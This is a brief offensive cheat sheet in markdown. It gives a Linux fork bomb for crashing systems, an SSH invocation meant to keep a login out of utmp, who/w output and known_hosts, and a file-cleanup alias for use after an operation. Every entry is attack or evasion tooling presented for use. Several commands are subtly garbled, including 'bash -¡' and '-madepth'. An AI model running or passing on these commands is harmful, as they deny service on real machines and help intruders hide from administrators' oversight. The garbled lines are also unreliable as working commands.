`TODO sort into indv files`

---

### Attacks

**1. Linux Fork Bomb**
```
:(){ :|: & };:
```
```
- This will create processes until the system "crashes"
```
---

### Evasion - Stealth

**1. "Almost Invisible SSH"** 
```
ssh -o UserKnownHostsFile=/dev/null -T user@example. com "bash -¡"
``` 
```
- This will not add your user to the /var/log/utmp file and you won't show up in w or who command of logged in users. 
- It will bypass profile and bash profile as well. 
- On your client side it will stop logging the host name to ~/.ssh/known_hosts.*

**2. Delete empty files left behind**
```
alias rm0="find . -madepth 1 -size 0 -delete -print"
```
```
- Very useful after a mess of unsuccessful output files in a post-op
```
